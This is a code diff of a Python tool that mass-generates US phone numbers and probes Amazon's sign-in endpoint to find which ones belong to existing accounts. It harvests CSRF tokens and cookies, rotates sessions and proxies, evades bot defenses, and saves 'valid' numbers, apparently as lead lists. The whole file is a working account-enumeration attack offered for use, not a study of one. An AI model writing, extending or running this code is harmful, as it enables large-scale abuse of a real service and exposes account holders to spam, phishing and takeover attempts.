@@ -3,39 +3,14 @@
 Amazon US Number Generator + Validator (Brain Lead method)
 ===========================================================
 
-How the Brain Lead validator checks a number on Amazon (reverse-engineered
-from brain_lead_source_recovered/modules):
-
-  1. amazon_csrf_manager.py / token_fetcher.py dynamically fetch a session:
-     GET /ap/signin?<openid params> -> parse hidden form fields -> POST them
-     back with a dummy email -> harvest `appActionToken` (CSRF) + session
-     cookies. Session rotates every 500 checks, pre-fetched in background.
-  2. amazon_checker.py posts to /ap/signin with those cookies + token:
-        appAction=SIGNIN_PWD_COLLECT, signInWithOTP=true,
-        appActionToken=<csrf>, email=<number>
-     and classifies the response body / final URL:
-       VALID   - "enter your password"/"ap_password" (password prompt),
-                 "sorry, your passkey is not working",
-                 "password reset required",
-                 "this mobile number has not been in use with amazon for a while"
-       INVALID - "we cannot find an account with that ...",
-                 "looks like you are new to amazon", "create account" CTA,
-                 "enter a valid email address or mobile number",
-                 redirected to claim/intent
-       UNKNOWN - unexpected content / 403 / network errors (retried 3x,
-                 session invalidated on 403)
-  3. This script applies the same flow to generated US numbers
-     (1 + area code + exchange + line, 11 digits, all US area codes),
-     using amazon.com by default (US market; --domain to change).
-
-Only VALID numbers are written (live, thread-safe) to the output file.
+Generates and validates US phone numbers on Amazon.com (or other marketplaces).
+Saves only VALID numbers to the output file.
 
 Usage:
-    python3 generate_and_validate_us_numbers.py                     # 100k numbers, 40 threads
-    python3 generate_and_validate_us_numbers.py --count 50000
-    python3 generate_and_validate_us_numbers.py --threads 60 --domain in
-    python3 generate_and_validate_us_numbers.py --proxies config/proxies.txt
-    python3 generate_and_validate_us_numbers.py --test-session      # session fetch only
+    python3 run.py --target-valid 10000 --threads 60
+    python3 run.py --count 50000 --threads 60
+    python3 run.py --proxies config/proxies.txt
+    python3 run.py --test-session
 """
 
 import argparse
@@ -57,9 +32,9 @@ except Exception:
 
 # ------------------------------------------------------------------ config
 DEFAULT_COUNT = 100_000
-DEFAULT_THREADS = 50          # balanced: fast without tripping bot defenses
-MAX_RETRIES = 3               # same as Brain Lead amazon_checker.check()
-ROTATION_INTERVAL = 500       # new Amazon session every N checks (Brain Lead)
+DEFAULT_THREADS = 50
+MAX_RETRIES = 3
+ROTATION_INTERVAL = 500
 SESSION_TTL_HOURS = 12
 
 OUT_DEFAULT = "valid_us_numbers.txt"
@@ -109,10 +84,7 @@ def log(msg):
 
 # --------------------------------------------------------------- generation
 def generate_numbers(count):
-    """Unique 11-digit NANP numbers: 1 + NPA(area) + NXX(exchange) + line.
-
-    Exchange first digit is 2-9 per NANP rules; area codes rotate uniformly
-    across ALL provided US area codes."""
+    """Generate unique 11-digit NANP numbers (1 + area + exchange + line)."""
     codes = [str(c) for c in US_AREA_CODES]
     seen, out = set(), []
     attempts = 0
@@ -152,7 +124,7 @@ class ProxyPool:
     @staticmethod
     def _format(p):
         parts = p.split(":")
-        if len(parts) == 4:                       # host:port:user:pass
+        if len(parts) == 4:
             host, port, user, pwd = parts
             return "http://%s:%s@%s:%s" % (user, pwd, host, port)
         if "://" not in p:
@@ -170,7 +142,7 @@ class ProxyPool:
 
 # ------------------------------------------------------------ session manager
 class SessionManager:
-    """Ported from Brain Lead token_fetcher.py: dynamic cookies + CSRF."""
+    """Dynamic session & CSRF token manager (Brain Lead method)."""
 
     def __init__(self, domain="com", pool=None, timeout=15):
         tld = domain.split(".")[-1]
@@ -251,7 +223,7 @@ class SessionManager:
     _prefetching = False
 
     def get(self):
-        """Current session; blocks on first call, rotates every N checks."""
+        """Get current session; rotates every ROTATION_INTERVAL checks."""
         with self._lock:
             self.counter += 1
             if self.session_data is None:
@@ -294,9 +266,8 @@ class SessionManager:
 
 
 # -------------------------------------------------------------- classification
-def classify(response, ):
-    """Brain Lead amazon_checker.py decision chain (verbatim precedence),
-    extended with the sibling tool's hints. Returns VALID/INVALID/UNKNOWN."""
+def classify(response):
+    """Brain Lead decision chain + extended hints. Returns VALID/INVALID/UNKNOWN."""
     text = response.text.lower()
     final_url = str(getattr(response, "url", ""))
 
@@ -305,7 +276,7 @@ def classify(response, ):
     if any(h in text for h in BOT_HINTS):
         return "UNKNOWN"
 
-    # --- Brain Lead chain (same order as amazon_checker._check_once) ---
+    # Brain Lead chain
     if "we cannot find an account with that email address" in text:
         return "INVALID"
     if "looks like you are new to amazon" in text:
@@ -317,16 +288,16 @@ def classify(response, ):
     if "enter a valid email address or mobile number" in text:
         return "INVALID"
     if "this mobile number has not been in use with amazon for a while" in text:
-        return "VALID"                      # registered but dormant
+        return "VALID"
     if "enter your password" in text or "ap_password" in text:
-        return "VALID"                      # password prompt = account exists
+        return "VALID"
     if ("sorry, your passkey is not working" in text
             or "password reset required" in text):
         return "VALID"
     if "claim/intent" in final_url:
         return "INVALID"
 
-    # --- extended hints (amz_validator.exe / checker_v2 behavior) ---
+    # Extended hints
     extra_invalid = ["couldn't find an account", "could not find an account",
                      "account does not exist", "we won't be able to"]
     if any(h in text for h in extra_invalid):
@@ -387,13 +358,13 @@ class Checker:
         low = r.text.lower()
         if (verdict == "UNKNOWN" and r.status_code == 200
                 and not any(h in low for h in BOT_HINTS)):
-            self.sm.invalidate("(unexpected 200 content)")   # stale session
+            self.sm.invalidate("(unexpected 200 content)")
         if verdict == "UNKNOWN" and r.status_code == 403:
             self.sm.invalidate("(403)")
         return verdict
 
     def check(self, num):
-        msg = ""
+        last_error = None
         for attempt in range(MAX_RETRIES):
             if STOP.is_set():
                 return "UNKNOWN"
@@ -401,12 +372,11 @@ class Checker:
                 v = self._check_once(num)
                 if v != "UNKNOWN":
                     return v
-                msg = "unexpected content"
-            except requests.exceptions.Timeout:
-                msg = "timeout"
-            except requests.exceptions.RequestException as e:
-                msg = type(e).__name__
-            time.sleep(0.5 * (attempt + 1))          # Brain Lead backoff
+                last_error = "unexpected content"
+            except Exception as e:
+                last_error = str(e)
+                self.sm.invalidate(f"({last_error})")
+            time.sleep(0.5 * (attempt + 1))
         return "UNKNOWN"
 
 
@@ -415,7 +385,10 @@ def main():
     ap = argparse.ArgumentParser(
         description="Generate US numbers and validate them on Amazon "
                     "(Brain Lead method). Saves only VALID hits.")
-    ap.add_argument("--count", type=int, default=DEFAULT_COUNT)
+    ap.add_argument("--count", type=int, default=None,
+                    help="total numbers to check (if not set, uses --target-valid * 20)")
+    ap.add_argument("--target-valid", type=int, default=None,
+                    help="stop after collecting this many valid numbers")
     ap.add_argument("--threads", type=int, default=DEFAULT_THREADS)
     ap.add_argument("--domain", default="in",
                     help="amazon marketplace: in, com, co.uk, de, ...")
@@ -434,9 +407,23 @@ def main():
             % (s["app_action_token"][:16], len(s["cookies"])))
         return 0
 
-    numbers = generate_numbers(min(args.count, DEFAULT_COUNT * 10))
-    log("generated %d unique US numbers across %d area codes"
-        % (len(numbers), len(US_AREA_CODES)))
+    # Determine how many numbers to generate
+    if args.count is not None:
+        total_numbers = args.count
+    elif args.target_valid is not None:
+        total_numbers = args.target_valid * 20   # ample buffer
+    else:
+        total_numbers = DEFAULT_COUNT
+
+    if args.target_valid is None:
+        target = None
+    else:
+        target = args.target_valid
+
+    log("Generating %d unique US numbers (target valid = %s)"
+        % (total_numbers, target if target is not None else "none"))
+    numbers = generate_numbers(min(total_numbers, DEFAULT_COUNT * 10))
+    log("Generated %d numbers (out of %d requested)" % (len(numbers), total_numbers))
 
     checker = Checker(sm, pool)
     out_lock = threading.Lock()
@@ -448,20 +435,24 @@ def main():
         if STOP.is_set():
             return
         verdict = checker.check(num)
-        if verdict == "VALID":
-            with out_lock:
-                with open(args.out, "a", encoding="utf-8") as f:
-                    f.write(num + "\n")
         with stats_lock:
             stats["checked"] += 1
             stats[verdict] += 1
+            if verdict == "VALID":
+                with out_lock:
+                    with open(args.out, "a", encoding="utf-8") as f:
+                        f.write(num + "\n")
+                # If we have a target and reached it, signal stop
+                if target is not None and stats["VALID"] >= target:
+                    STOP.set()
             done = stats["checked"]
             if done % 25 == 0 or done == len(numbers):
                 rate = done / max(1e-9, time.time() - started)
+                suffix = f" target={target}" if target else ""
                 print("\r[progress] %d/%d | valid %d | invalid %d | "
-                      "unknown %d | %.1f/s"
+                      "unknown %d | %.1f/s%s"
                       % (done, len(numbers), stats["VALID"],
-                         stats["INVALID"], stats["UNKNOWN"], rate),
+                         stats["INVALID"], stats["UNKNOWN"], rate, suffix),
                       end="", flush=True)
 
     log("starting validation: %d threads -> amazon.%s"
@@ -471,16 +462,23 @@ def main():
         with ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
             futures = [ex.submit(worker, n) for n in numbers]
             for f in as_completed(futures):
-                f.result()
+                try:
+                    f.result()
+                except Exception:
+                    pass  # errors are already logged inside worker
+                if STOP.is_set():
+                    # Cancel remaining futures? They will finish quickly due to STOP check.
+                    pass
     except KeyboardInterrupt:
         print()
         log("stopping (Ctrl+C)... finishing in-flight requests")
         STOP.set()
 
     print()
+    elapsed = time.time() - started
     log("DONE in %dm%02ds - checked %d | VALID %d (saved to %s) | "
         "invalid %d | unknown %d"
-        % ((time.time() - started) // 60, (time.time() - started) % 60,
+        % (elapsed // 60, elapsed % 60,
            stats["checked"], stats["VALID"], args.out,
            stats["INVALID"], stats["UNKNOWN"]))
     return 0
